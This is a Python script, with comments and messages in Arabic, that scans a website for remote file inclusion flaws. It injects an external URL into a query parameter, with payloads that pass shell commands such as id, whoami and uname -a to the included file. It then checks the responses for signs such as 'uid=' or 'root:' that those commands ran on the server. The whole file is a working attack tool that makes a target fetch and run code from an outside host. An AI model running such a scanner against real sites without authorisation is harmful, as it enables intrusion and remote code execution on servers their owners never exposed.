import requests

def scan_rfi(url, external_url, param="file"):
    """
    يقوم بفحص الموقع لاكتشاف ثغرات RFI باستخدام طرق أكثر دقة.
    :param url: عنوان الموقع الذي تريد فحصه.
    :param external_url: رابط خارجي يتم حقنه.
    :param param: اسم المعامل المراد حقنه (افتراضي: "file").
    """
    payloads = [
        f"{external_url}",
        f"{external_url}?cmd=id",
        f"{external_url}?cmd=whoami",
        f"{external_url}?cmd=uname -a",
        f"{external_url}?cmd=pwd",
    ]

    
    indicators = [
        "uid=",  
        "root:",  
        "server at",  
        "document root",  
        "REMOTE_ADDR",  
        "HTTP_USER_AGENT"
    ]

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    }

    for payload in payloads:
        target_url = f"{url}?{param}={payload}"
        try:
            print(f"[*] تجربة الحمولة: {payload}")
            response = requests.get(target_url, headers=headers)

            
            for indicator in indicators:
                if indicator.lower() in response.text.lower():
                    print(f"[+] تم اكتشاف ثغرة RFI عند: {target_url} - المؤشر: {indicator}")
                    break
            else:
                print(f"[-] لم يتم اكتشاف ثغرة RFI عند: {target_url}")

        except requests.exceptions.RequestException as e:
            print(f"[!] خطأ أثناء الاتصال بـ {target_url}: {e}")
